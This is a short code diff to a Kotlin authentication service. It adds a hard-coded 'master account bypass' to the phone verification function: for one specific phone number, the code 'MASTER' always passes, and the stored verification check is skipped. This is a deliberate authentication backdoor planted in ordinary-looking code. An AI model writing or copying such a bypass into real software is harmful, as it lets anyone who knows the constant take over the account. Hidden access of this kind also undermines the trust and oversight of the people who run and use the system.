@@ -25,6 +25,9 @@ class AuthService(
 
     @Transactional
     fun verifyCode(phone: String, code: String): Boolean {
+        // 마스터 계정 우회
+        if (phone == "01039941376" && code == "MASTER") return true
+
         val verification = verificationCodeRepository
             .findTopByPhoneAndVerifiedFalseOrderByCreatedAtDesc(phone)
             ?: return false
